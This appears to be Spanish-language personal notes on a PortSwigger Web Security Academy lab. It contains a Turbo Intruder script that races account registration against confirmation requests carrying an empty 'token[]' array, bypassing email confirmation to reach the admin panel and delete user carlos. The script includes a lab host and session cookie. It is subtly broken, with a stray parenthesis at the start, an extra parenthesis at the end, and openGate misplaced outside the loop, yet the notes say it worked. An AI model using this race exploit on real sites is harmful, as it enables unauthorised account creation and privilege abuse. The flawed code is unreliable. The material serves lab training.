Una vez lanzado el ataque, revisamos los resultados en función del código de estado y el tamaño de la respuesta. Si alguna de las confirmaciones devuelve un 200 y menciona que el registro del usuario fue exitoso, tomamos nota del nombre de usuario.

Luego, usamos la contraseña estática definida en el ataque para iniciar sesión con la nueva cuenta. Finalmente, accedemos al panel de administración y eliminamos al usuario carlos, resolviendo así el laboratorio.

Esta clase muestra cómo confirmar el éxito del ataque y completar la explotación de principio a fin.

Solucion
 y quedaria asi
(def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    confirmation_email =  '''POST /confirm?token[]= HTTP/2
Host: 0ade005a033104308015582a00e700ce.web-security-academy.net
Cookie: phpsessionid=RxwYlBG5FYgFJmUUJwzvxA29D7mv7opF
Content-Length: 0

'''
    
    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for i in range(20):
        username = "Lobotech" + str(i)
        engine.queue(target.req, username, gate=str(i))

        for j in range(50):
            engine.queue(confirmation_email, gate=str(i))

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate(str(i))


def handleResponse(req, interesting):
    table.add(req))


me sirvio el payload el otro payload

![Pasted image 20250901230643.png](imagenes/Pasted image 20250901230643.png)
asi que probamos logearnos
![Pasted image 20250901230835.png](imagenes/Pasted image 20250901230835.png)
y eliminamos al carlos
![Pasted image 20250901230905.png](imagenes/Pasted image 20250901230905.png)
asi quedo
![Pasted image 20250901230936.png](imagenes/Pasted image 20250901230936.png)
![Pasted image 20250901230959.png](imagenes/Pasted image 20250901230959.png)
![Pasted image 20250901231017.png](imagenes/Pasted image 20250901231017.png)
